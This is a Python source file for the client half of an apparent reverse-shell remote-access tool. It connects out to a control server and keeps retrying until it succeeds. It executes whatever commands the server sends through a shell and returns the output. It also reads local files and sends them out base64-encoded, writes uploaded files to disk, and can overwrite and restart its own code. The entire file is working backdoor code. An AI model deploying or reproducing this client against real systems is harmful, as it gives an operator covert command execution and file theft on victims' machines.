import os
from os import execv
import socket
import subprocess
import sys
from os.path import expanduser, realpath
from base64 import b64decode, b64encode
from time import sleep


class Client(object):
    def __init__(self, host='', port=6667, recv_size=1024, server_shutdown=False, session_id='', shutdown_kill=False):
        self.host = host
        self.port = port
        self.recv_size = recv_size
        self.server_shutdown = server_shutdown
        self.shutdown_kill = shutdown_kill
        self.session_id = session_id
        self.reconnect_to_session = True
        self.sock = self._connect_to_server()

    def _connect_to_server(self):
        """
        Ping the control server until it accepts the connection.

        :return:
        """

        self.sock = False
        self.connected = False

        # Loop until the connection is successful.
        while True:
            self.sock = socket.socket()
            try:
                self.sock.connect((self.host, self.port))
                print('Connected to server...')
                break
            except socket.error as the_error_message:
                print('Waiting for control server {}:{} {}'.format(self.host, self.port, the_error_message))
                sleep(5)

        return self.sock

    def _send_output_with_cwd(self, some_data):
        """
        Send something back to the control server with the current
        working directory appended to the end of it.

        :param some_data:
        :return:
        """

        self.sock.send(str.encode(some_data + str(os.getcwd()) + '> ' + '~!_TERM_$~'))
        return self

    def send_data(self, some_data, echo=True, encode=True):
        """
        Send data to the server with the termination string appended.

        :param some_data:
        :param echo:
        :return:
        """
        if echo:
            print('Sending Data:', some_data)
        if encode:
            self.sock.send(str.encode(some_data + '~!_TERM_$~'))
        else:
            self.sock.send(some_data)
            self.sock.send(str.encode('~!_TERM_$~'))
        return self

    def receive_data(self, echo=False, decode=True):
        """
        Receive data from the server until we get the termination string.

        :param echo:
        :param decode:
        :return:
        """

        # Try to receive data.
        accepting = True
        total_data = ''
        print('Receiving data...')
        while accepting:
            try:
                data = self.sock.recv(self.recv_size)
            except socket.error as error_message:
                print('Server closed connection:', error_message)
                self.sock.close()
                self.sock = self._connect_to_server()
                continue

            # Continue looping if there is no data.
            if len(data) < 1:
                print('Zero data received...')
                self.sock.close()
                self.sock = self._connect_to_server()
                continue

            # Decode from bytes.
            if decode:
                d = data.decode('utf-8')
            else:
                d = b64decode(data)

            total_data += d
            if echo:
                print('Data:', d)

            # Check for termination string.
            if total_data[-10:] == '~!_TERM_$~':
                accepting = False

        if echo:
            print('Data received: {}'.format(total_data[:-10]))

        # Chop off the termination string from the total data and assign it to data.
        # Data should now be a string as well.
        data = total_data[:-10]
        return data

    def set_session_id(self, session_id):
        """
        Set the session id for the client.

        :param session_id:
        :return:
        """

        self.session_id = session_id
        return self

    def reboot_self(self):
        try:
            self.sock.close()
        except socket.error:
            pass
        restart_command = [
            '',
            realpath(__file__),
            'port={}'.format(self.port),
            'host={}'.format(self.host),
            'recv_size={}'.format(self.recv_size),
            'server_shutdown={}'.format(self.server_shutdown),
            'session_id='.format(self.session_id)
        ]
        execv(sys.executable, restart_command)
        sys.exit()

    def negotiate_server_shutdown(self):
        if self.server_shutdown:
            self.send_data('Y')
            self.sock.close()
            if self.shutdown_kill:
                sys.exit()
            self.reboot_self()
        else:
            self.send_data('N')
        return self

    def handle_disconnect(self):
        print('Disconnecting...')
        # Handle a disconnect command.
        self.send_data('confirmed')
        self.sock.close()
        print('Sleeping for 5 seconds...')
        sleep(5)
        self._connect_to_server()
        return self

    def write_file_data(self, upload_data, upload_filepath):
        """
        Write the upload_data to the upload_filename

        :param upload_data:
        :param upload_filepath:
        :return:
        """

        with open(realpath(upload_filepath), 'wb') as f:
            f.write(b64decode(upload_data))
        print('<', upload_filepath, 'written...', '>')
        return

    def handle_file_upload(self, upload_data, upload_filename):
        """
        Handle the file upload.

        :param upload_data:
        :param upload_filename:
        :return:
        """

        try:
            self.write_file_data(upload_data, upload_filename)
            self.send_data('Got file.')
        except FileNotFoundError as err_msg:
            self.send_data('Could not fine the directory to write to: {}'.format(err_msg))

        return self

    def main(self):
        """
        Start receiving commands.

        :return:
        """

        # If we have a socket, then proceed to receive commands.
        if self.sock:
            upload_filepath = False
            while True:
                data = self.receive_data()

                if len(data) < 500:
                    # Set the session id.
                    if data[14:] == 'set-session-id':
                        self.set_session_id(data.split(' ')[1])
                        continue

                    if data == 'oyster getcwd':
                        self._send_output_with_cwd('')
                        continue

                    # Check to see if the client should send the
                    # server shutdown confirmation.
                    if data == 'server_shutdown?':
                        self.negotiate_server_shutdown()
                        continue

                    if data[:7] == 'connect':
                        try:
                            uuid = data.split(' ')[1]
                        except IndexError:
                            print('No sesssion-id provided.')
                            self.send_data('False')
                            continue

                        if uuid == self.session_id:
                            if self.reconnect_to_session:
                                print('Connecting to session.')
                                self.send_data('True')
                                self.session_id = uuid
                                continue
                            print('Will not connect to current session')
                            self.send_data('False')
                            continue
                        else:
                            self.send_data('True')
                            self.session_id = uuid
                        continue

                    if data == 'oyster ping':
                        self.send_data('pong')
                        continue

                    if data == 'disconnect':
                        self.handle_disconnect()
                        continue

                    # Break the loop.
                    if data == 'break':
                        self.send_data(' ')
                        break

                    # Reboot self.
                    if data == 'shell reboot':
                        self.send_data('confirmed')
                        self.sock.close()
                        break

                    # Handle quit events sent from the server.
                    if data == 'quit':
                        self.send_data('confirmed')
                        sleep(1)
                        continue

                    if data[:4] == 'get ':
                        try:
                            with open(data[4:].strip(), 'rb') as f:
                                data = b64encode(f.read())
                                f.close()
                        except FileNotFoundError as err_msg:
                            self.send_data(str(err_msg))

                        self.send_data(data, encode=False)
                        continue

                    # Handle setting the file upload name.
                    if data[:16] == 'upload_filepath ':
                        upload_filepath = data[16:]
                        self.send_data('Got filepath.')
                        continue

                if data[:11] == 'upload_data':
                    if not upload_filepath:
                        self.send_data('Requires an upload filename.  Send with `upload_filename {filename}`.')
                        continue
                    self.send_data('Send Data')
                    upload_data = self.receive_data()
                    self.handle_file_upload(upload_data, upload_filepath)
                    continue

                # Update the client.py file(this file here).
                if data[:7] == 'update ':
                    print('Overwriting self...')
                    with open('client.py', 'w') as f:
                        f.write(data[7:])
                        f.close()
                    self.send_data('Client updated...\n')
                    print('Rebooting in 2 seconds...')
                    sleep(2)
                    print('###################### REBOOTING ######################')
                    self.reboot_self()
                    continue

                # Handle the cd command.
                if data[:2] == 'cd':
                    try:
                        _dir = data[3:]

                        # Cross platform cd to ~/
                        if _dir[:2] == '~/':
                            # Shorten variable name and function name for the next 1 liner.
                            p, expusr = sys.platform, expanduser
                            # Get the full path.
                            _dir = expusr('~') + '/' + _dir[2:] if p != 'win32' else expanduser('~') + '\\' + _dir[2:]
                            p, expurs = None, None
                            del p
                            del expurs

                        # Change the directory
                        os.chdir(_dir)
                        self.send_data('')
                        continue
                    except Exception as err_msg:
                        # If we get any errors, send em back!
                        err_msg = str(err_msg)
                        self.send_data(err_msg + "\n")
                        continue

                # Process the command.
                cmd = subprocess.Popen(
                    data[:],
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE
                )

                # Compile the output.
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_bytes, 'utf-8')

                print('Output Str: {}'.format(output_str))
                # Send the output back to control server.
                self.send_data(output_str)


if __name__ == '__main__':
    the_host = ''
    the_port = 6667
    the_recv_size = 1024
    the_server_shutdown = False
    the_session_id = ''

    def check_cli_arg(arg):
        global the_host
        global the_port
        global the_recv_size
        global the_server_shutdown
        global the_session_id

        if 'host=' in arg:
            the_host = arg.split('=')[1]
        elif 'port=' in arg:
            the_port = int(arg.split('=')[1])
        elif 'recv_size=' in arg:
            the_recv_size = int(arg.split('=')[1])
        elif 'server_shutdown=' in arg:
            the_server_shutdown = True if arg.split('=')[1].upper() == 'Y' else False
        elif 'session_id=' in arg:
            the_session_id = arg.split('=')[1].strip()

    restart_command = list(sys.argv)

    for argument in sys.argv[1:]:
        check_cli_arg(argument)

    # Instantiate the client.
    client = Client(
        host=the_host,
        port=the_port,
        recv_size=the_recv_size,
        server_shutdown=the_server_shutdown,
        session_id=the_session_id
    )
    client.main()

    restart_command.insert(0, '')
    execv(sys.executable, restart_command)
    sys.exit()
